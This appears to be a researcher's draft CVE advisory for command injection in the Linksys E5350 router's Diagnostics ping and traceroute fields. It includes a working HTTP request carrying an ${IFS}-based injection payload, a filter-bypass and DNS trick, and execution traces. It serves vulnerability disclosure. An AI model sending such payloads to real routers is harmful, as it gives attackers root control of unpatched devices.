# CVE-TBD: Linksys E5350 Diagnostics ping_ip/traceroute_ip Authenticated OS Command Injection

## Affected Product

- Vendor: Linksys
- Product: E5350
- Firmware: v1.0.00.037 (latest and last release; the product is end-of-life)
- Component: `httpd` Diagnostics handlers + `diag_pingbutton` / `diag_tracertbutton` service binaries

## Summary

An OS command injection vulnerability was discovered in Linksys E5350
firmware v1.0.00.037. The Diagnostics page handlers of the embedded
CyberTAN httpd store the user-supplied `ping_ip` and `traceroute_ip`
parameters into NVRAM **without any sanitization**; the diagnostic service
binaries (`diag_pingbutton`, `diag_tracertbutton`) then embed the raw value
into a shell command executed via `system()`, allowing an authenticated
attacker to execute arbitrary commands as root. Both parameters are
affected (two independent injection points of the same design flaw).

## Vulnerability Type / CWE

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
  (OS Command Injection)

## Root Cause

- `httpd` gozila dispatch table (0x496eb8): `Diagnostics/start_ping` →
  handler 0x4636f8 stores `ping_ip` verbatim
  (`nvram_set_value("ping_ip", pcVar1)`); `Diagnostics/start_traceroute` →
  handler 0x463bb0 stores `traceroute_ip` verbatim. No character filtering
  in either handler (unlike `ping_times`, which is whitelisted).
- `/bin/diag_pingbutton` builds the command with
  `snprintf(cmd, 100, "ping -c %d -s %d -o %s %s &", ...)` where the last
  `%s` is the raw `ping_ip`, then calls `system(cmd)`. Its input blacklist
  blocks only space, `|` and `>` — it does **not** block `;`, `$`, `&` or
  `(`, so `${IFS}` supplies whitespace and multi-command injection works.
  `/bin/diag_tracertbutton` is identical for `traceroute_ip` (~50-byte
  payload budget in its command buffer).
- A `getaddrinfo()` pre-check on the value must succeed; an attacker
  satisfies it with an A record on an authoritative DNS server they control
  (uClibc does not reject shell metacharacters in hostnames).
- Service trigger chain: httpd sets `action_service`, then
  `killall -HUP nvram_daemon`; nvram_daemon's SIGHUP handler is
  `start_single_service()` (librc.so), which launches the diag binary.

## Proof of Concept (non-destructive)

Authenticated session required (see companion filing
01-wizard-preauth-command-injection for the pre-auth factory-state variant
of the same sink).

```
POST /apply.cgi?session_id=<valid> HTTP/1.1
Host: <ROUTER_IP>
Content-Type: application/x-www-form-urlencoded

submit_button=Diagnostics&submit_type=start_ping&change_action=gozila_cgi&gui_action=Apply&commit=1&ping_times=5&ping_size=64&ping_ip=y%3Bcd%24%7BIFS%7D..%3Bcd%24%7BIFS%7Dtmp%3Btouch%24%7BIFS%7De5350_pwned2%3By
```

(`ping_ip` decodes to `y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y`.)

Observed on rehosted firmware (QEMU user-mode, full service chain):

- NVRAM store: `SET ping_ip=y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y`
- Syscall trace of `diag_pingbutton`:
  `execve("/bin/sh",{"sh","-c","ping -c 5 -s 64 -o /tmp/ping.log y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y &"})`
- Marker file `/tmp/e5350_pwned2` created by the injected shell commands
  (non-destructive PoC; no configuration changed).
- traceroute variant (`traceroute_ip=z;cd${IFS}..;cd${IFS}tmp;touch${IFS}p3;z`):
  `execve("/bin/sh",{"sh","-c","/usr/sbin/traceroute -I -O /tmp/traceroute.log -T 2 z;cd${IFS}..;cd${IFS}tmp;touch${IFS}p3;z &"})`,
  marker `/tmp/p3` created.

Control: a plain IP address (e.g. `192.168.1.1`) yields a normal ping run
with no side effects.

## Impact

Any authenticated web user (admin session) gains arbitrary command
execution as root — persistent backdoor installation, credential theft,
botnet enrollment. Chained with the factory-state pre-auth exposure
(companion filing 01) or the empty-password authentication bypass
(companion filing 02), this becomes an *unauthenticated* remote root RCE.

## Non-duplication

The Diagnostics ping/traceroute command-injection defect family is known in
other CyberTAN-based Linksys models — CVE-2013-3307 (E1000/E1200/E3200,
diagnostic ping over port 52000), CVE-2013-10058 (WRT160Nv2 `ping_size`),
CVE-2024-48286 (E3000, filed as its own CVE in 2024). None of these cover
the E5350, and per-product filing is established practice for this code
lineage. The E5350 instances (handlers 0x4636f8 / 0x463bb0 plus the
`diag_*button` service binaries) are documented here for the first time.
The only existing E5350 CVE is CVE-2022-35572 (information disclosure,
unrelated).

## Proposed CVSS 3.1

`AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` — **6.8 (Medium)**

## Discovery

- Date: 2026-10-11
- Method: static reverse engineering (Ghidra) + dynamic verification on
  rehosted firmware (QEMU user-mode) with syscall-level runtime evidence
- Researcher: Zimo-666

## Timeline

- 2026-10-11: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
